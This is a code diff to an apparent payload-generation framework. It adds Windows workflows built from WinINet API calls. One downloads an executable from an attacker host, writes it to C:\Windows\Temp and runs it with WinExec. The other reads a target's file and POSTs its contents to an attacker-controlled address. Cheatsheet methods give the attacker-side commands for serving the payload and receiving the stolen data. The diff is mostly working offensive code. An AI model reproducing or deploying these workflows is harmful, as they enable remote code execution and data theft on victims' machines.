@@ -15,6 +15,10 @@ Reference workflows:
   - copy_then_run: CopyFileA followed by WinExec
   - move_then_run: MoveFileA followed by WinExec
   - check_path: GetFileAttributesA to test file existence
+  - tcp_stager: recv size header, VirtualAlloc RWX, recv loop, CallSlot
+  - tcp_download: recv loop then write-to-disk and WinExec
+  - http_download: WinINet InternetReadFile loop, write-to-disk, WinExec
+  - http_exfil: ReadFile loop into buffer, WinINet POST to attacker
 """
 from __future__ import annotations
 
@@ -1597,4 +1601,454 @@ class IRTcpDownloadTemplate(WorkflowTemplate):
             ("Protocol", "[4 bytes LE size][raw file bytes]"),
             ("Written to", dst),
             ("Auto-executed via WinExec after download", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# HTTP download workflow
+# ---------------------------------------------------------------------------
+
+_PAGE_READWRITE = 0x04
+_DEFAULT_USER_AGENT = "Mozilla/5.0"
+_DEFAULT_ALLOC = 0x100000
+
+
+def build_http_download_workflow(
+    url: str = "http://192.168.1.100/payload.exe",
+    dst_path: str = r"C:\Windows\Temp\payload.exe",
+    user_agent: str = _DEFAULT_USER_AGENT,
+    alloc_size: int = _DEFAULT_ALLOC,
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the http_download reference workflow.
+
+    InternetOpenA -> InternetOpenUrlA -> VirtualAlloc(PAGE_READWRITE) ->
+    InternetReadFile chunked loop (BOOL return + bytes_read==0 EOF check) ->
+    InternetCloseHandle x2 ->
+    CreateFileA -> WriteFile -> CloseHandle -> WinExec(dst) -> exit
+
+    The read loop passes the full remaining byte count to InternetReadFile;
+    the API handles partial reads internally.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_http_download",
+        blocks=(
+            Block("entry", (
+                ConstructString("user_agent", user_agent),
+                ConstructString("url", url),
+                ConstructString("dst_path", dst_path),
+
+                AllocateLocal("bytes_total"),
+                AllocateLocal("bytes_read"),
+                AllocateLocal("buf_ptr"),
+
+                CallAPI(
+                    "InternetOpenA",
+                    arguments=(
+                        AddressOf("user_agent"),
+                        Immediate(1),     # INTERNET_OPEN_TYPE_DIRECT
+                        Immediate(0),     # lpszProxy = NULL
+                        Immediate(0),     # lpszProxyBypass = NULL
+                        Immediate(0),     # dwFlags = 0
+                    ),
+                    result="inet_session",
+                ),
+                Compare("inet_session", SuccessPredicate.NONZERO,
+                        true_block="open_url", false_block="fail"),
+            )),
+
+            Block("open_url", (
+                CallAPI(
+                    "InternetOpenUrlA",
+                    arguments=(
+                        NameRef("inet_session"),
+                        AddressOf("url"),
+                        Immediate(0),     # lpszHeaders = NULL
+                        Immediate(0),     # dwHeadersLength = 0
+                        Immediate(0),     # dwFlags = 0
+                        Immediate(0),     # dwContext = 0
+                    ),
+                    result="inet_url",
+                ),
+                Compare("inet_url", SuccessPredicate.NONZERO,
+                        true_block="alloc_buffer", false_block="fail"),
+            )),
+
+            Block("alloc_buffer", (
+                CallAPI(
+                    "VirtualAlloc",
+                    arguments=(
+                        Immediate(0),                   # lpAddress = NULL
+                        Immediate(alloc_size),
+                        Immediate(_MEM_COMMIT_RESERVE),
+                        Immediate(_PAGE_READWRITE),
+                    ),
+                    result="virt_buf",
+                ),
+                Compare("virt_buf", SuccessPredicate.NONZERO,
+                        true_block="init_read", false_block="fail"),
+            )),
+
+            Block("init_read", (
+                WriteSlot("bytes_total", Immediate(0)),
+                Jump("read_loop"),
+            )),
+
+            Block("read_loop", (
+                ArithOp("buf_ptr", NameRef("virt_buf"),
+                        NameRef("bytes_total"), "add"),
+                CallAPI(
+                    "InternetReadFile",
+                    arguments=(
+                        NameRef("inet_url"),
+                        NameRef("buf_ptr"),
+                        Immediate(alloc_size),
+                        AddressOf("bytes_read"),
+                    ),
+                    result="irf_ret",
+                ),
+                Compare("irf_ret", SuccessPredicate.NONZERO,
+                        true_block="check_eof", false_block="read_done"),
+            )),
+
+            Block("check_eof", (
+                Compare("bytes_read", SuccessPredicate.NONZERO,
+                        true_block="accumulate", false_block="read_done"),
+            )),
+
+            Block("accumulate", (
+                ArithOp("bytes_total", NameRef("bytes_total"),
+                        NameRef("bytes_read"), "add"),
+                Jump("read_loop"),
+            )),
+
+            Block("read_done", (
+                CallAPI(
+                    "InternetCloseHandle",
+                    arguments=(NameRef("inet_url"),),
+                ),
+                CallAPI(
+                    "InternetCloseHandle",
+                    arguments=(NameRef("inet_session"),),
+                ),
+                Jump("write_file"),
+            )),
+
+            Block("write_file", (
+                CallAPI(
+                    "CreateFileA",
+                    arguments=(
+                        AddressOf("dst_path"),
+                        Immediate(_GENERIC_WRITE),
+                        Immediate(0),               # dwShareMode = 0
+                        Immediate(0),               # lpSecurityAttributes = NULL
+                        Immediate(_CREATE_ALWAYS),
+                        Immediate(_FILE_ATTRIBUTE_NORMAL),
+                        Immediate(0),               # hTemplateFile = NULL
+                    ),
+                    result="file_handle",
+                ),
+                Compare("file_handle", SuccessPredicate.INVALID_HANDLE,
+                        true_block="do_write", false_block="fail"),
+            )),
+
+            Block("do_write", (
+                CallAPI(
+                    "WriteFile",
+                    arguments=(
+                        NameRef("file_handle"),
+                        NameRef("virt_buf"),
+                        NameRef("bytes_total"),
+                        AddressOf("bytes_read"),
+                        Immediate(0),               # lpOverlapped = NULL
+                    ),
+                    result="write_ret",
+                ),
+                CallAPI(
+                    "CloseHandle",
+                    arguments=(NameRef("file_handle"),),
+                ),
+                Jump("exec_payload"),
+            )),
+
+            Block("exec_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dst_path"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare("exec_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRHttpDownloadTemplate(WorkflowTemplate):
+    """IR-backed http_download template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_http_download_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_http_download_workflow(
+            url=config.url or "http://192.168.1.100/payload.exe",
+            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
+            alloc_size=config.alloc_size or _DEFAULT_ALLOC,
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        url_val = config.url or "http://192.168.1.100/payload.exe"
+        dst = config.dst_path or r"C:\Windows\Temp\payload.exe"
+        return [
+            ("Serve file via HTTP",
+             f"python3 -m http.server {config.lport} --bind {config.lhost}"),
+            ("URL fetched", url_val),
+            ("Written to", dst),
+            ("Auto-executed via WinExec after download", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# HTTP exfiltration workflow
+# ---------------------------------------------------------------------------
+
+_GENERIC_READ = 0x80000000
+_OPEN_EXISTING = 3
+_FILE_SHARE_READ = 1
+_INTERNET_SERVICE_HTTP = 3
+
+
+def build_http_exfil_workflow(
+    src_path: str = r"C:\Users\target\secret.txt",
+    exfil_host: str = "192.168.1.100",
+    exfil_port: int = 8080,
+    url_path: str = "/exfil",
+    user_agent: str = _DEFAULT_USER_AGENT,
+    alloc_size: int = _DEFAULT_ALLOC,
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the http_exfil reference workflow.
+
+    Phase 1 (read file into buffer):
+      CreateFileA(GENERIC_READ) -> VirtualAlloc(PAGE_READWRITE) ->
+      ReadFile chunked loop -> CloseHandle(file)
+
+    Phase 2 (POST data to attacker):
+      InternetOpenA -> InternetConnectA(host, port, HTTP) ->
+      HttpOpenRequestA("POST", url_path) ->
+      HttpSendRequestA(buf, bytes_total) ->
+      InternetCloseHandle x3 -> exit
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_http_exfil",
+        blocks=(
+            Block("entry", (
+                ConstructString("src_path", src_path),
+                ConstructString("user_agent", user_agent),
+                ConstructString("exfil_host", exfil_host),
+                ConstructString("url_path", url_path),
+                ConstructString("http_post", "POST"),
+
+                AllocateLocal("bytes_total"),
+                AllocateLocal("bytes_read"),
+                AllocateLocal("buf_ptr"),
+
+                CallAPI(
+                    "CreateFileA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        Immediate(_GENERIC_READ),
+                        Immediate(_FILE_SHARE_READ),
+                        Immediate(0),               # lpSecurityAttributes = NULL
+                        Immediate(_OPEN_EXISTING),
+                        Immediate(_FILE_ATTRIBUTE_NORMAL),
+                        Immediate(0),               # hTemplateFile = NULL
+                    ),
+                    result="file_handle",
+                ),
+                Compare("file_handle", SuccessPredicate.INVALID_HANDLE,
+                        true_block="alloc_buffer", false_block="fail"),
+            )),
+
+            Block("alloc_buffer", (
+                CallAPI(
+                    "VirtualAlloc",
+                    arguments=(
+                        Immediate(0),                   # lpAddress = NULL
+                        Immediate(alloc_size),
+                        Immediate(_MEM_COMMIT_RESERVE),
+                        Immediate(_PAGE_READWRITE),
+                    ),
+                    result="virt_buf",
+                ),
+                Compare("virt_buf", SuccessPredicate.NONZERO,
+                        true_block="init_read", false_block="fail"),
+            )),
+
+            Block("init_read", (
+                WriteSlot("bytes_total", Immediate(0)),
+                Jump("read_loop"),
+            )),
+
+            Block("read_loop", (
+                ArithOp("buf_ptr", NameRef("virt_buf"),
+                        NameRef("bytes_total"), "add"),
+                CallAPI(
+                    "ReadFile",
+                    arguments=(
+                        NameRef("file_handle"),
+                        NameRef("buf_ptr"),
+                        Immediate(alloc_size),
+                        AddressOf("bytes_read"),
+                        Immediate(0),               # lpOverlapped = NULL
+                    ),
+                    result="rf_ret",
+                ),
+                Compare("rf_ret", SuccessPredicate.NONZERO,
+                        true_block="check_eof", false_block="read_done"),
+            )),
+
+            Block("check_eof", (
+                Compare("bytes_read", SuccessPredicate.NONZERO,
+                        true_block="accumulate", false_block="read_done"),
+            )),
+
+            Block("accumulate", (
+                ArithOp("bytes_total", NameRef("bytes_total"),
+                        NameRef("bytes_read"), "add"),
+                Jump("read_loop"),
+            )),
+
+            Block("read_done", (
+                CallAPI(
+                    "CloseHandle",
+                    arguments=(NameRef("file_handle"),),
+                ),
+                Jump("inet_open"),
+            )),
+
+            Block("inet_open", (
+                CallAPI(
+                    "InternetOpenA",
+                    arguments=(
+                        AddressOf("user_agent"),
+                        Immediate(1),     # INTERNET_OPEN_TYPE_DIRECT
+                        Immediate(0),     # lpszProxy = NULL
+                        Immediate(0),     # lpszProxyBypass = NULL
+                        Immediate(0),     # dwFlags = 0
+                    ),
+                    result="inet_session",
+                ),
+                Compare("inet_session", SuccessPredicate.NONZERO,
+                        true_block="inet_connect", false_block="fail"),
+            )),
+
+            Block("inet_connect", (
+                CallAPI(
+                    "InternetConnectA",
+                    arguments=(
+                        NameRef("inet_session"),
+                        AddressOf("exfil_host"),
+                        Immediate(exfil_port),
+                        Immediate(0),     # lpszUserName = NULL
+                        Immediate(0),     # lpszPassword = NULL
+                        Immediate(_INTERNET_SERVICE_HTTP),
+                        Immediate(0),     # dwFlags = 0
+                        Immediate(0),     # dwContext = 0
+                    ),
+                    result="inet_conn",
+                ),
+                Compare("inet_conn", SuccessPredicate.NONZERO,
+                        true_block="http_open", false_block="fail"),
+            )),
+
+            Block("http_open", (
+                CallAPI(
+                    "HttpOpenRequestA",
+                    arguments=(
+                        NameRef("inet_conn"),
+                        AddressOf("http_post"),
+                        AddressOf("url_path"),
+                        Immediate(0),     # lpszVersion = NULL
+                        Immediate(0),     # lpszReferrer = NULL
+                        Immediate(0),     # lplpszAcceptTypes = NULL
+                        Immediate(0),     # dwFlags = 0
+                        Immediate(0),     # dwContext = 0
+                    ),
+                    result="inet_request",
+                ),
+                Compare("inet_request", SuccessPredicate.NONZERO,
+                        true_block="http_send", false_block="fail"),
+            )),
+
+            Block("http_send", (
+                CallAPI(
+                    "HttpSendRequestA",
+                    arguments=(
+                        NameRef("inet_request"),
+                        Immediate(0),     # lpszHeaders = NULL
+                        Immediate(0),     # dwHeadersLength = 0
+                        NameRef("virt_buf"),
+                        NameRef("bytes_total"),
+                    ),
+                    result="send_ret",
+                ),
+                CallAPI(
+                    "InternetCloseHandle",
+                    arguments=(NameRef("inet_request"),),
+                ),
+                CallAPI(
+                    "InternetCloseHandle",
+                    arguments=(NameRef("inet_conn"),),
+                ),
+                CallAPI(
+                    "InternetCloseHandle",
+                    arguments=(NameRef("inet_session"),),
+                ),
+                Jump("success"),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRHttpExfilTemplate(WorkflowTemplate):
+    """IR-backed http_exfil template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_http_exfil_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_http_exfil_workflow(
+            src_path=config.src_path or r"C:\Users\target\secret.txt",
+            exfil_host=config.lhost,
+            exfil_port=config.lport,
+            url_path=config.url_path or "/exfil",
+            alloc_size=config.alloc_size or _DEFAULT_ALLOC,
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        src = config.src_path or r"C:\Users\target\secret.txt"
+        url_p = config.url_path or "/exfil"
+        return [
+            ("Catch POST",
+             f"python3 Tools/http_exfil_server.py --port {config.lport} "
+             f"--bind {config.lhost}"),
+            ("Source file on target", src),
+            ("POST endpoint",
+             f"http://{config.lhost}:{config.lport}{url_p}"),
         ]
